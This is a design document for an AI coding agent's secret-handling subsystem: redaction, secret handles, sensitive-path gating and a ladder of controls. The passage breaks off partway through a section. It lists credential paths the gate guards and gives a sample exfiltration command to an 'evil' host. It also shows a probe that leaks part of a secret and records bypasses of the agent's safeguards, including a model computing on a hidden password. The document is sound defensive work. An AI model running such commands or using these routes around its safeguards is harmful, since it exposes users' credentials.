5. **Output of a command that expanded a secret is re-scanned** before it goes
   back — a secret spent can be a secret echoed.

**How rule 4 is actually enforced**, because it turned out to need saying in
three places: a secret handle forces a human at the **engine** (an override
applied after the winning rule, so an explicit `allow` cannot beat it), at the
**grant** (`A` cannot create a standing permission for it — since
2026-09-30 structurally: `RuleSet::proposed_allow` offers a rule only if the
policy plus that rule would allow the call, and the override outranks any
allow; it was `Verdict::may_be_remembered`, a list of causes), and at every
**entry point** (one
`resolve_for_gate`, so the edit path is not a second policy). There were three
sources of allow authority and originally only one of them checked; the same
shape hid a bypass of §7 as well.

Residual, stated plainly: a secret bound to `api.github.com` can still be spent
*at* `api.github.com` in a way the user did not intend (deleting a repo, say).
Audience binding bounds *where*, not *what*. Bounding *what* is the sandbox
milestone and, ultimately, credentials scoped at the issuer.

**A rule never carries a credential the model typed** (11-08). The grant's
other direction: `A` writes a rule from the line, its words as written, and
`:config save` writes rules into the project's file, beside its code.
Apiiro measured what that shape does in Claude Code (published 11-07): "Yes,
and don't ask again" saved the approved command, password included, to
`.claude/settings.local.json`, and 1,122 of 104,185 public copies held a
real secret — mostly passwords INSIDE commands (`PGPASSWORD=`, `sshpass
-p`, a bearer header), which key-format scanners miss. A read-only trace of
Shannon (11-08) found the same path: `A` proposed `sshpass <pw> ssh … *`,
and `:config save` wrote it into `.shannon/config.toml`. `A` now names no
rule for a word that is a credential:

- by POSITION — the value of a flag whose name is one of §5's hints
  (`--password`, `--token`, `--api-key`), modelled or not, at ANY length:
  the position is the evidence free text lacks, so §5's value floor does
  not apply;
- by SHAPE — any token §5 takes out: a known format, a URL's userinfo, a
  high-entropy run.

A credential the rule would not hold does not stop it: `--password=x`
written into its flag rides under an unmodelled program's `*`. The reason
says where the value sat, never the value — a refusal reaches the screen
and the log. NOT caught, by decision (Steven, 11-08: "what matters is when
something is *obviously* a password"): the value after a short flag that
does not say so (`-p`, `-a`) of a program Shannon does not model; a model
saying the flag takes a credential closes it.

A rule TYPED holding one is refused the same way, by the same definition
(`permission::credential_in_rule`, which reads `credentials_in`), at
`:allow`/`:ask`/`:deny` — the one door
into the session's rules (`session_rules` has one writer; `:set` cannot
write `permissions.*`), and so into everything `:config save` writes. And
asked again at the save, of each rule (`App::credential_in_rule`, both
sites): a door checks the moment of entry, and a value can be marked after
the rule that holds it; such a rule stays this session's, and the save says
so without the value (review stop 17, E1 M2; this paragraph said a check at
the save was a guard nothing reaches, and that was wrong). Written into its
flag (`--api-key=x`), a typed rule's value IS in the rule, and is refused;
the redactor over the whole text catches one in a `#` comment, a held value
by what it masked. A line the shell cannot read — a rule's grammar takes a
stray `'` — is read by its words, never answered "nothing there" (E1 M3).

**`redact = false` does not reach a rule** (11-09). The switch says what
leaves for the provider; a rule is kept as written and published by a save.
Its shape is read with redaction on, the rest of `[secrets]` as you set it
(`SecretsConfig::for_rules`), so a URL's password is refused as a
`--password`'s value is. They disagreed with the switch off, the one arm
never asking it (review stop 17, E1 L6; Steven: "let's refuse both").

Next, in order: §5's
floor made context-aware; and a rule may name a secret by its label, so a
credential the user marks can still be ruled — amending rule 4 for that
secret and that form only (Steven, 11-08: "Yes, let's go for it").

==============================================================================
7. `.env` AND SENSITIVE PATHS                                 *secrets-paths*

**Keys visible, values masked, by default.** The agent nearly always needs to
know *which* variables exist, not what they equal — that is the whole of the
usefulness, and none of the danger:

>
    DATABASE_URL=[secret: db-url]
    STRIPE_KEY=[secret: stripe-key]
<
Full-value reads are opt-in, per path, and never sticky by accident.

**A command touching a sensitive path never auto-runs**, whatever §8 concludes
for reads generally — and this is an **override**, not a fallthrough. It first
shipped inside the "no rule spoke" branch, where any matching `allow`
short-circuited it and `path_policy = "deny"` — chosen precisely for a hard
boundary — went inert. Two user settings that compose to fail *open* is worse
than either alone.

Scope: operands, **flag values** (`ssh -i ~/.ssh/id_rsa`, at least as common as
the positional form), and redirect targets. A path in *program* position is
excluded on purpose: a program named `credentials` is not a credential file, and
executing one is not the exfiltration shape this guards. It still asks, via the
unmodeled-program rule.

**The shipped path set is a SEED, not the list** (Steven, 2026-07-25: *"secrets
and stuff can be stored in all kinds of locations. We may never know."*). It is
`[secrets] paths`, config-extensible, in the shape of the existing `env_hazard`
oracle — honest, growing, one place. What we ship knowing about:

    ~/.ssh  ·  ~/.aws  ·  ~/.gnupg  ·  ~/.config/gh  ·  ~/.claude
    {claude-home}  (Claude Code's home as launch found it — 10-19, L1)
    .env*  ·  *.pem  ·  *.key  ·  *.gpg  ·  *.kdbx
    id_rsa/id_ed25519  ·  credentials(.json)  ·  .netrc  ·  .npmrc  ·  .pypirc

A hardcoded list protects the median setup and silently fails everyone else, so
the same rule holds as for credential *shapes* (`[secrets] prefixes`, shipped in
P1): defaults for most, config for the rest, forkability for the remainder.

Two directions of enforcement, because they fail differently:
- the **path** list catches `cat ~/.ssh/id_ed25519` before it runs;
- **redaction** (§5) catches the same key arriving from a path we never listed.

==============================================================================
7a. THE ESCAPE HATCH IS A CAPABILITY, NOT A SWITCH           *secrets-granular*

Some people want the agent to **use** their keys, and that is legitimate. The
lazy answer is a global "turn the protection off" flag —
`--dangerously-skip-permissions`, which is one bit for every question at once,
so the only way to permit one thing is to permit everything. Steven's ask
(2026-07-25) is to be **more fine-grained than that**.

The reframe that makes it possible: **"let the agent use my key" and "let the
agent read my key" are different requests**, and only the second is dangerous.

    want                            answer
    ────────────────────────────────────────────────────────────────────
    the agent should CALL an API    tokenisation (§4) — it spends a handle;
    that needs my token             the value never enters its context
    the agent should SEE the        opt in, per path, deliberately
    contents of one secret file
    I accept the risk wholesale     `redact = false` exists; we do not
                                    remove it, we just make it unnecessary

So the axes are independent, and each is separately settable — reading is not
the price of using:

    [secrets] redact / redact_high_entropy / prefixes / extra   (P1, shipped)
    [secrets] paths + path_policy                               (P2, shipped)
    [secrets] env — lend a key without lending sight of it      (P3, shipped)
    per-secret audience binding (§6.2)                          (P4)

The design goal is that **nobody has a reason to reach for the sledgehammer**.
If someone still does, it is their machine — we say plainly what it turns off
and get out of the way ([[feedback_sane_defaults_rings]]: good design encourages
the intended use and never blames the user).

==============================================================================
8. THE OPEN DECISION: `ReadOnly ⇒ Allow`                      *secrets-reads*

Steven's, not yet made. Today a read-only command runs with no pane and no
keypress. The original reasoning is sound and worth keeping — asking about `ls`
buys nothing and trains dismissal, and a dismissed prompt is worth less than no
prompt. What changed is that `Allow` now means *"spawn a process and send its
output to a third party"*, not *"we would not have asked"*.

With §5 and §7 in place, the residue is small: an unlisted path holding a secret
in a shape redaction misses. Options remain (a) keep auto-run, (b) a config knob,
(c) first-sighting-per-session. **Recommendation: keep auto-run once §5 + §7
land**, because they close the mechanism rather than taxing every read — and
revisit if dogfooding shows otherwise.

==============================================================================
9. PHASES                                                     *secrets-phases*

Each green-committed, each with a planted-key test (a fake credential in a file
and in the env; assert it appears in neither the request body nor the store —
mutation-checked, per [[feedback_mutation_check_guards]]).

- **P1 — egress redaction (§5). SHIPPED.** Widest coverage per line of code, and
  it protects every later phase. `[secrets] redact`, `redact_high_entropy`,
  `prefixes` (user-extensible shapes), `extra` (verbatim values). Scrubbing
  happens at *capture*, inside `exec`, so no downstream consumer — wire,
  transcript, or store — can see cleartext. `NAME=value` masks the value and
  keeps the name, which is §7's property arriving early.
- **P2 — sensitive paths (§7). SHIPPED.** `[secrets] paths` (seed + user
  additions) and `path_policy = ask|deny|allow`. A stage whose operands OR
  redirect targets touch such a path never runs unattended, whatever its effect
  says; the gate names which pattern matched and why it matters. `.env`
  keys-visible/values-masked arrived with P1 (the `=` boundary).
- **P3a — the general shape (§3a, §3b). SHIPPED.** One substitution table with
  **sensitivity as its own axis**, so the same mechanism serves credentials,
  privacy and token economy. Plain aliases resolve at the gate, secrets at exec;
  the nonce exists only where a capability does; plain masking is word-bounded
  and secret masking is not. Plus **name-directed masking**, the
  format-independent answer to values with no distinguishing shape
  (`password: hunter2`), guarded by segment-suffix matching and a required
  delimiter. `[[alias]]`, `[secrets] names`, `[secrets] value_delimiters`,
  `:alias`.
- **P3 — tokenisation (§4). SHIPPED.** `[secrets] env` lends named environment
  variables as `{{secret:label.nonce}}` handles: session-stable, nonce-derived,
  never persisted. The model is told them in the tool definition; the user gets a
  notice per spend and `:secrets` to list. Expansion happens inside the exec
  attempt, so `ExecOutcome.command` — and therefore the transcript, the store and
  the audit log — keeps the handle form. A handle in a line always faces a human
  (defeating `allow`), and an unknown one refuses to run. Redaction gained the
  return leg: a held value appearing in output comes back as its handle rather
  than an anonymous `[redacted: …]`, so the model can act on the result.
- **P4 — deputy reduction (§6).** Audience binding (§6.2) is the remaining
  substance: rules 1, 3 and 4 landed with P3 (a handle is `{`-bearing, so the
  analyzer already treats it as an unresolved operand and the provenance engine
  traces it; an unanalyzable line already fails closed at the gate; expansion
  already never auto-runs). What is left is binding each secret to the
  destinations it may be spent toward, and re-scanning is already covered by the
  redaction return leg (§6.5).

- **P3c — checksum validation + per-issuer lengths. SHIPPED (2026-07-26).**
  `secrets/format.rs` holds the issuer shapes: prefix, kind, minimum body length,
  optional offline validator. GitHub's classic tokens carry a base62 CRC32, so
  they are now caught at any offset — including the un-separated case that was a
  documented miss. Additive by construction, and a property test's discovery of
  `hf_`-prefixed filenames being redacted is what produced the per-issuer
  lengths.
- **P3b — two review passes + property tests. SHIPPED (2026-07-26).** An Opus
  elegance reviewer and an Opus white-hat, then fuzzing. Between them: the
  shape-based inert-region bypass (§5), a remembered-grant path that skipped both
  engine overrides (§6), the sensitive-path guard living in a fallthrough (§7),
  an edit path that gated without expanding, a PEM header that required a
  newline, and `~` expansion announcing itself as a spent secret. `ResolveAt`
  came out of the elegance pass; idempotence came out of asking the fuzzing
  question before writing a test.

==============================================================================
10. USER-MARKED SECRETS (designed, not built)               *secrets-marking*

Steven, 2026-07-26: *"let the user explicitly tell us what to remove but they
want it put back in so the conversation makes sense."*

Everything so far decides for the user — by shape (§5), by path (§7), by config
(§4). This is the case where **they already know**: a password in a paste, a
customer name, an internal hostname. They should be able to say so.

## The mechanism already exists

A user-marked secret is `Aliases::insert(name, value, "marked by you",
sensitive = true)`. Masking outbound, resolution at exec, the gate stopping, the
refusal on an unminted handle, `:alias` listing it — all of it comes free. **The
feature is a UI for §3a's table, not a new mechanism.** That is a good sign: if
marking had needed new machinery, the table would have been the wrong shape.

So the whole design question is the *interface*, and specifically: how does a
user say "this span is secret" without that statement colliding with what they
are writing?

## Why in-band delimiters are wrong, in both forms

`[redact]hunter2[/redact]` collides with code, as Steven noted — we would be
making people escape around us, in a prompt that is *usually* full of code.
Every delimiter we could pick is someone's syntax.

The tempting fix is an **invisible** delimiter: a zero-width space, a
private-use codepoint. **Reject this**, and we have first-hand evidence why: our
own fuzz generators feed ZWSP, NBSP and bidi overrides at this subsystem
*precisely because* invisible characters break things. They survive a
copy-paste into another program silently; they end up in files and git history;
they make `len()`-based cursor logic wrong in ways nobody can see to debug; and
"text that hides characters from the reader" is itself a known attack class — we
would be shipping the technique we defend against. A marker the user cannot see
is a marker the user cannot verify.

## The shape that has no collision at all: substitute AT THE BOUNDARY

Three designs, and the third is the one that is right. Worth recording all three,
because each was wrong for a different reason.

**1. A delimiter in the text** (`[redact]…[/redact]`) collides with code, and an
*invisible* delimiter is worse — see the rejection above.

**2. A span carried beside the text.** No collision, but the span must survive
every edit, join, undo and paste, and a span that drifts by one character does
not fail loudly: it vaults the wrong range, leaving the secret in and hiding
something innocent.

**3. Substitute in the buffer.** No spans, no drift — and it was still wrong,
which dogfooding showed within minutes. It replaced the user's own sentence with
a placeholder, made `u` and `<C-r>` into a toggle for whether a value was
protected, and answered a question nobody asked. Steven, 2026-07-26: *"we control
the display. Why not show the actual password in the prompt? We only need to hide
it from the LLM call."*

**The answer: hide at the boundary, not in the editor.**

>
    prompt + transcript   my password is hunter2beornot2be   (styled)
    the wire + the store  my password is {{pw-1.4f19}}
<
Marking records the value in the table and **touches nothing else**. The
boundary has two halves. **Authoring**: text the user writes is masked before it
becomes a turn — the prompt at turn start, a `:child` briefing, `:Send`, and the
`$EDITOR` edits and summaries (`App::mask_authored`). **Outbound**: every
request is masked again at the one launch door (`spawn_tagged`), secrets only,
so a path that forgets cannot send a value — the editor paths forgot until round
18 (Reviewer E), and a value typed before it was marked sits in history in clear.
The streamed reply is un-masked for display. The model is sent handles, so it echoes handles
back — and a user reading `{{secret.2864}}` in a reply is being shown our
plumbing rather than their conversation. That is the pre/post-hook
shape, and it is strictly better than all three alternatives:

- **No spans**, because the table already knows the values: masking finds them by
  lookup, not by position.
- **No lying to the user about their own prompt.** We own the display; showing
  someone a placeholder where their sentence was buys nothing and costs trust.
- **No undo footgun.** Marking is not an edit, so no editing key can toggle
  whether a value is protected.
- **Display and record separate cleanly** — the fifth axis (§3c), arriving where
  it was always going to be needed first. On *resume* the transcript is rebuilt
  from the store, so it shows handles. A MARKED secret is kept (41,
  `secrets/vault.rs`) and recalled into the table before the history renders,
  so its handle resolves and displays again — in a reply as `value
  ({{handle}})`, both styled (Steven, 2026-10-02: the value alone hid what
  crossed the wire), and in the user's own line as the value alone, as typed
  ("the input should still be the literal input"); a lent one (env, config) gets a
  fresh handle per launch, so a resumed session genuinely no longer holds the
  old one's value. Recall is keyed on provenance — see Q4 below.

**Length is not a requirement, in either direction** — for a value the user
MARKED. (The automatic name rule in §5 does have a 12-character floor, and the
two do not conflict: marking is the user telling us, so there is nothing to
guess; the name rule is us guessing, and a guess needs evidence the value
itself supplies. A short password the heuristic spares is exactly what
`:secret` is for.) There was briefly a floor
on what could be marked and a length-based matching threshold; both were wrong
(Steven, dogfooding 2026-07-26: *"users are typing in the explicit value"*).
Refusing `hunter2` for being seven characters is imposing our implementation on
someone's situation. And **sensitivity decides how to match; length decides
nothing**: for a secret a missed match is a *leak* while an over-match is only a
mangled message, so a secret is masked wherever it appears at any length. A
plain alias keeps word-boundary matching, because there the errors are the other
way round.

**The handle carries no decoration.** `{{s:secret-1.2864}}` said "secret" twice
and then numbered the only one there was. A secret is now `{{secret.2864}}` or
`{{github-token.7f1a}}`, and an index appears only when there is a second of the
same kind. Recognition is by the **shape we mint** — `{{name.nnnn}}` — rather
than by a sigil, because a bare `{{` would make every Helm, Jinja, Handlebars,
Go and Vue template look like a secret being spent, and a gate that fires on
every template is the dismissal-training failure aimed at our loudest signal.
The nonce was already doing that work; the sigil was paying for it twice.

The residual, stated plainly: **edit a marked value after marking it and the
edited form is no longer recognised.** Masking matches the value it was given.
The redaction net still covers credential-shaped remnants, and re-marking fixes
it, but an arbitrary edited fragment cannot be caught. That is the price of
having no spans, and it is a much smaller price than a span that drifts silently.

## Three entry surfaces, in the order they earn their keep

1. **Paste (no keystroke at all). SHIPPED.** The 90% case, and the one where a
   user is most likely to leak by accident. Pasting a credential-shaped token
   raises a y/N offer naming the kind: *"that looks like a github token — keep it
   off the wire?"* It **offers rather than acts** — a paste that silently became
   a handle would be a surprise, and surprise is how a protection gets switched
   off — and "no" leaves the text untouched.

   Note the gap this leaves, found immediately in dogfooding: **typing** a key
   raises no offer, because there is no paste event to hook. The submit-time
   check (below) is the answer to that, not a second paste heuristic.

   One correctness note from building it: the candidate must be a **single
   token**. `classify_kind` classifies a *token*, and feeding it a whole paste
   made `src/main.rs:42: cannot find type \`Foo\`` register as a high-entropy
   string. Nobody pastes a key with a sentence attached, so requiring no
   whitespace is both the correct use of the classifier and the right filter.
2. **`:secret <text>`. SHIPPED** — the manual path, for a value typed rather
   than pasted. Deliberately *literal text* rather than a pattern: a regex here
   would be a way to mark the wrong thing by accident, and the wrong thing is
   someone's message. It refuses visibly when the text is not in the prompt,
   because a mark that did not happen must never look like one that did.
3. **Normal/Visual — an operator (not yet).** Vim-first means the answer is an
   operator rather than a mode: `gs{motion}` marks a motion's range, `gss` the
   line, `gs` in Visual marks the selection. That is exactly the `gu`/`gU`/`gq`
   grammar, so it composes with every motion and text object we have: `gsi"`
   marks what is inside the quotes — precisely the shape a pasted key takes.
   Composability is the argument: we do not invent a selection language, we
   inherit one.
4. **Insert — a toggle (not yet)**, since there is no selection to operate on.
   `<C-x><C-s>` opens a secret run, typing is rendered `••••`, `<C-x><C-s>`
   closes it. `<C-x>` is already our insert-mode prefix (`<C-x><C-e>` for the
   editor), and a toggle is unambiguous where "mark what I just typed" is not.

All three are keymap entries, so they are rebindable like everything else.

## What the user sees, and the one honest limit

**Every renderer must consult the table, and the secret style must win.** The
first implementation styled only the two buffer panes, so a marked password
showed in the *ordinary* colour in the transcript — DIM for the user echo,
markdown styling for an assistant reply. Worse than plain: a value inside a
markdown code span rendered *as code*, which reads "here is a literal to copy",
the exact opposite of what we mean. So the secret style **replaces** the base
rather than blending with it: one fact wins here, and it is ours.

**Style the real value, in place.** The buffer holds what the user wrote, so
styling is exactly the right tool: no character count changes, so the cursor and
the Visual selection stay in step, and the user reads their own sentence with the
protected part marked out. This is the case Steven asked for directly — *"why not
stylize and color the password instead of replacing it in the visual
interface"* — and it is only possible because substitution moved to the boundary.

The colour is **outside the danger palette**, per §10b: `Tone` is green/yellow/
red and every value on it claims *how dangerous this is*, which a withheld secret
is not. It composes with a `Tone` rather than competing — a dangerous command
carrying a withheld value is both things at once.

**The count is the part that survives.** On submit: *"1 secret withheld (pw-1) —
the handle went, the value stayed here."* It names which, because with the value
styled in place the count is the only thing that says a substitution actually
happened on the way out. A styled span stops being evidence the
moment it scrolls off; a count is checkable, and its absence is meaningful.

The limit worth saying out loud: marking means the model can **spend** the
value, not **reason** about it. *"Is `{{secret:pw.4f19ac30}}` a strong
password?"* cannot be answered from the handle, and the model should say so
rather than guess. That is inherent to §4 — but it is the right *default*, not
the only option, and §10a is the way out.

==============================================================================
10a. WHEN SOMEONE NEEDS TO REASON ABOUT IT                   *secrets-reveal*

Steven, 2026-07-26: *"That's definitely the default we should be on, but do we
have the ability to provide an escape hatch for those that need to reason about
it?"*

Yes, in two layers — and the first one covers most of what people actually mean,
at no cost at all.

## Layer 1 — send a PROPERTY, not the value (built)

The realisation that makes this cheap: *"reason about the secret"* almost always
means *"answer a question about the secret"*, and the inputs to that answer can
be computed **on this machine** and sent as facts. We already have the maths —
`shannon_bits` and `classify` were written for detection and answer these
directly.

>
    "is this password strong enough?"
        → 32-63 characters, contains lowercase + uppercase + digits,
          high randomness (key-like), no known issuer format
    "is this the right kind of token?"
        → 32-63 characters, contains lowercase + digits, github token
    "did the value get truncated?"
        → under 16 characters, contains lowercase, low randomness
<
That is `Aliases::describe`, and it answers every question above **without a
character of the value leaving**. Sending a property costs nothing and is
reversible in the only sense that matters: nothing was disclosed.

**The description is deliberately coarse**, and a test enforces it. The first
draft reported entropy to one decimal place, which distinguishes two values a
single character apart — that is not "is it strong", that is a search-space
narrowing, handed to the party we are trying not to inform. Length is bucketed
for the same reason. *Precision is disclosure; give a human question a human
answer.*

## The channel spending opens, and the control for it

Dogfooding against a real model (2026-07-26) produced the clearest possible
demonstration. Asked *"is my password secure?"*, Haiku said — unprompted —
*"I can't see the value of your password directly"*, then wrote a strength
checker that spent the handle, and answered from the **analysis**. Layer 1
invented by the model itself, which is a good sign for the design.

It also showed the limit. That script printed length, character classes and a
verdict — a fair fingerprint — and nothing stops a narrower probe:
`echo "{{secret.7059}}" | head -c 3` returns three characters, too short to trip
any matcher, straight into the model's context.

**This is inherent, not a defect.** A value that can be *used* by a computation
whose output the model reads is an oracle, and every oracle leaks; the only
question is bandwidth. Two consequences worth stating plainly:

- **Audience binding (§6.2) does not close it.** That bounds *where* a secret may
  be spent, not what may be computed on it locally. It remains worth building,
  but not for this.
- **"A human approved it" is a weaker control here than it looks.** The command
  that ran was a thirty-line Python heredoc. Reading a script to decide whether
  it leaks a password is not a realistic ask of a person answering a prompt.

So the honest control is **not to grant spending where it was not wanted**.
`spendable` is its own axis: `--no-spend` marks a value that is masked on the way
out and **never expanded** — the oracle simply does not exist for it, because
there is nothing to compute on. Spending stays the *default*, because lending a
credential for use is the common case (Steven's call, 2026-07-26); `--no-spend`
is for the values that never needed it.

The model is told about non-spendable handles too, as unusable. Otherwise it
spends a turn trying, or decides the substitution was a mistake to work around.

## Layer 2 — actually reveal it (designed, not built)

Some questions genuinely need the characters: *"why is this token being
rejected?"*, *"is there a typo in the middle?"*. For those, `:reveal <name>`,
with three properties that make it honest:

1. **Explicit and per-turn.** Never a mode, never sticky. Revealing is an act,
   not a setting, and the next turn is back to the handle.
2. **Stated as irreversible, because it is.** Once the value is in a request it
   is in someone's retention window; no later action retracts it. The notice
   should say exactly that, and say that the right follow-up is to *rotate*.
3. **Resolved at SEND, not stored.** This is the part the existing design gives
   us for free: it is a third position on the [`ResolveAt`] axis. The stored
   turn keeps the handle and expansion happens on the way out — so the value
   reaches the provider and *still* never reaches our episode log or the
   transcript. Resume re-expands at send, exactly as exec does, so the round trip
   is consistent and the content hash still describes what we stored.

The axis absorbing a case we had not thought of when we built it is the same
signal as §10's mechanism already existing: **flexible structure is what lets a
new requirement be a new value rather than a new mechanism.** A little planning
saves a lot of work (Steven, 2026-07-26).

Open: whether `:reveal` should refuse for a secret sourced from `env` (where the
user never typed the value and may not realise what is about to leave) while
allowing it for one they marked themselves. Leaning yes — the two cases differ
in whether the user has *seen* what they are disclosing.

==============================================================================
10b. SHOWING WHAT DID NOT LEAVE                             *secrets-visible*

Steven, 2026-07-26: *"format a bit differently in the chat pane (and in the
prompt pane when they are typing the secret themselves). That will provide a
good hint and also let them know **what didn't** leave their machine."*

The second half is the requirement. A protection nobody can see is a protection
nobody can trust — and worse, it is indistinguishable from one that silently
stopped working. The rendering is not decoration here; it is the evidence.

## Protection is not danger, so it must not ride the danger scale

[`Tone`] is `Safe | Warn | Danger` — green/yellow/red, ordered so the loudest
wins when spans overlap. Every value on it claims **how dangerous this is**. A
withheld secret is not a point on that scale:

- **green** would assert "this is safe", a claim about the *command* rather than
  about our having withheld something;
- **yellow/red** would say "worry about this", when the correct feeling is the
  opposite — the thing worth worrying about is precisely the case where nothing
  is marked.

So a withheld span gets its **own visual role**, orthogonal to `Tone`, and the
two must be able to co-occur: `curl {{secret:gh.…}} http://evil` is a dangerous
command *and* carries a withheld value, and the reader needs both facts.

## Two panes, two different jobs

**Prompt pane, while typing.** The user is *composing* and needs to check what
they typed, so show the real characters, styled to say "this is marked". Masking
here is the wrong trade — nobody can proofread a password they cannot see, and it
has not left the machine yet, so there is nothing to protect it *from*. The style
says *marked*, not *hidden*.

**Chat pane, after submit.** The value is gone and the handle is what exists. We
own this rendering entirely, so it should read as a **statement about what was
withheld**, not as leftover machinery:

>
    prompt (composing)   deploy with hunter2seekrit to prod
                                     ^^^^^^^^^^^^^ marked style
    chat (after submit)  deploy with ▌secret: db-password▐ to prod
                         · 1 secret withheld from this message
<
The status line is the part that answers Steven's "what didn't leave": a
per-message count, present even when the span itself has scrolled away. And the
raw handle stays reachable on inspect, because the *display* being friendly must
not make the underlying value unverifiable.

## Rules that fall out

1. **Never render a withheld span as absent.** Something must occupy the space,
   or the sentence quietly changes meaning and a protected message becomes
   indistinguishable from a mangled one. Same rule as the verbosity knob: quiet
   means folded, never gone.
2. **The marker is a glyph plus a style, and both are config.** ASCII-safe by
   default (no emoji — we handle wide characters carefully everywhere else and
   should not import the problem here), overridable like `graph_glyphs`.
3. **The count is the honest summary.** "1 secret withheld" is checkable; a
   coloured span alone is not, once it is off screen.
4. **Reveal (§10a layer 2) must look different from withhold**, and louder. Those
   are opposite events, and the one that actually discloses should be the harder
   of the two to miss.

==============================================================================
10c. SPEEDBUMPS, HINTS, AND WHOSE DECISION IT IS            *secrets-posture*

Steven, 2026-07-26, after watching a real model derive facts about a password it
could not see:

>
    "Most security is ultimately going to end up being speedbumps. There are
    times where we need formal verification (such as an actual sandbox) but
    there are constant trade-offs. If we were trying to make something that
    was completely unbreakable then the result would be something that is
    entirely useless."
<
This is the posture the whole document should be read through, and it is worth
stating once rather than re-deriving per feature.

## The adversary is an eager optimizer, not an attacker

We have now met it directly. Asked whether a password was secure, the model did
not attack anything — it *helpfully* wrote a script that computed on a value it
had been told it could not see. Nothing was malicious; it was optimizing for the
user's stated goal and the boundary was simply not the shortest path.

That changes what a control is for. Against an attacker you need a wall. Against
an eager optimizer you mostly need the **helpful path and the safe path to be the
same path** — and where they are not, a speedbump is often enough, because
nothing is trying to get around it on purpose.

It also explains why "completely unbreakable" is the wrong target. Every
tightening costs capability, and a tool that cannot spend a key cannot do the job
someone lent it a key for. The scale runs from a hint at one end to a sandbox at
the other, and **the right point on it depends on whose work it is**.

## A hint is a real control, and we were already using one by accident

The thing we had not considered: *tell the model the boundary exists*. Our tool
description says these values are secrets the user lent, that the values are not
available, and that a handle not listed will refuse to run — and in the trace the
model repeated that reasoning back before acting on it.

That will not stop an eager optimizer from finding a path around. It **slows it
down**, and against something that is not adversarial, slowing down is often the
whole job. It is also the cheapest control there is: prose in a tool definition.

So: **the model is a participant in the posture, not only its subject.** Where we
have a boundary, say so — in the tool description, in the tool result, in the
refusal text. We already do this for redaction (`[redacted before sending: … —
the real value stayed on the user's machine]`) and for spending
(`[secret substituted at execution: … — the value was used, not shown]`); the
principle is that every one of those messages is doing security work, not just
bookkeeping.

## The user picks the point on the scale; we build the scale

Some people work on things where a tight sandbox is the only acceptable answer.
Others need an agent that can spend a key, and would abandon a tool that refused.
**Neither is wrong, and neither is our decision.**

    hint         tell the model the boundary exists      free, weakest
    visibility   show what left and what did not (§10b)  free
    gate         a human answers first                   cheap, human-limited
    capability   `--no-spend`: never expand it (§10a)    exact, costs a feature
    isolation    a sandbox: it cannot reach out at all   strong, costs the most

Our job is that **every rung exists, is nameable, and composes** — not to pick
one and ship it as the answer. That is the environment thesis applied to
security: `[[feedback_build_environment]]`, `[[feedback_sane_defaults_rings]]`.

Two consequences for how we write this down:

1. **Never claim a rung is stronger than it is.** A speedbump described as a wall
   is worse than no speedbump, because someone will build on the claim. This
   document has had to walk two such claims back already (§6 rule 3, and "a human
   approved it").
2. **Defaults are a recommendation, not a verdict.** Ship the rung most people
   need, name the others in the same breath, and make switching a config line
   rather than a fork.

==============================================================================
11. OPEN QUESTIONS                                            *secrets-open*

1. Where do audiences (§6.2) come from — inferred from the secret's name, or
   declared in config? Declared is honest but is another thing to maintain.
2. Does redaction apply to the *prompt* the user types? They may paste a key.
   (Leaning yes, with a visible notice — the same protection, and no surprise.)
3. `[secrets]` vs folding into `[exec]`. **Settled (P1): its own section.** It
   governs more than execution — the store and the audit log read the same
   scrub — and `[exec]` would have implied otherwise.
4. Do we ever *store* a mapping across sessions? **Settled (P3): no.** The vault
   is not `Serialize` and the seed is per-session, so a stale handle cannot
   expand to a rotated secret. It also cannot be a persistence bug later, because
   there is nothing to persist.
   **Revisited (41, 2026-10-01): yes, for MARKED secrets** — one record per
   exact handle (`secrets/vault.rs`). Steven: "we have to be able to load the
   secrets back into the session." **Where, decided 2026-10-23** —
   `[secrets] password_protect`, in Steven's words:

   > When `secrets.password_protect=false` (the default):
   > - A resumed message *does not* use keychain to prompt the user for the
   >   password.
   > - The chat still shows `hunter2` and ***NOT*** `{{secret.06ea}}`
   >
   > When `secrets.password_protect=true`:
   > - A resumed message *does* request a password for the user
   > - If the password is typed: the conversation loads, and we show `hunter2`
   > - If the password is not provided: the conversation *does not* load.

   What the USER is shown and what the MODEL is sent are separate: the model
   has the handle either way. One store, Shannon's own owner-only files under
   the state directory (`FileVault`), whatever the setting; plain records are
   guarded by the permission gate, as nothing that asks no password can be
   guarded better. **The password is a Shannon passphrase that seals records
   at rest** (Steven, 10-23: "stays cross compatible and gives us a path to
   later do exporting and importing of conversations"): set in the config
   file only, never by `:set`; forgotten, the sealed secrets are lost, with no
   way back. Not the OS store — it asks "is this the same program?", not "is
   the user here?" (`docs/Reviews/2026-10-23-password-protect/review.md`).
   The plan and its phases: `docs/Milestones/TODO.md`, "Secrets across
   runs". The table itself is still never serialized. A handle's
   16-bit nonce makes a kept handle guessable by brute force, so **what a
   history may ask the vault about is provenance, not shape** (56, 10-02):
   each turn records `Provenance::handles` — the handles it names that the
   session HELD when it was sealed — and recall asks about those alone. A
   guess planted in a file or page was never held, so it is never recorded
   and never asked; asking about every handle-shaped string, as recall first
   did, let one tool result carry 4096 guesses per 64 KiB (Reviewer E, round
   18). New turns are fail-closed (`Turn::seal` records none held); a log
   older than the field falls back to its own text, never a tool's output,
   capped at 32 asks.
5. *(new, P3)* Should a handle be spendable from the **user's** prompt, not just
   the model's tool call? Today the user can type one into an edited command at
   the gate and it resolves, which seems right. The open part is completion —
   handles carry a nonce precisely so they cannot be guessed, which makes them
   inconvenient to type. `:secrets` lists them; a `<Tab>` source is the obvious
   next step, and is a UI question rather than a security one.
6. *(new, P3)* Where else should a secret be lendable *from*? `env` is the safe
   first source because the value never touches a file we read. A `.env` file, a
   password manager (`op://`-style), or a keychain are all plausible; each is a
   new **ingest** path into the same vault, and the rest of the mechanism does
   not change. Deliberately not built until someone wants one.

vim:tw=78:ft=help:

## §12 — What each layer can and cannot do (measured, 2026-08-09)

Steven's framing, and the one to design against: **we mostly rely on userspace.**
The seed list is an *extra* layer over the narrow class of things userspace
permits but an eager optimizer is likely to abuse. So the useful question about
any finding is not "was this dangerous" but **"which layer failed, and is that
layer the right one to fix?"**

Three layers exist or could. Their limits are different in kind, and this section
records what was measured rather than what was assumed.

### Layer A — the permission gate (static text analysis). Fundamentally incomplete.

It reads a command line and decides. It therefore cannot resolve anything that is
only determined at run time:

- **operands that do not appear as text** — `xargs` (fixed, R3-2), and the same
  shape in `find -files0-from`, `grep -f`, `tar -T`;
- **variables and globs** — `$VAR`, `*.pe?` (named residuals);
- **what a path points AT** — a symlink inside the workspace aimed outside it.
  This is not theoretical: CVE-2025-53109 / CVE-2025-53110 are exactly a
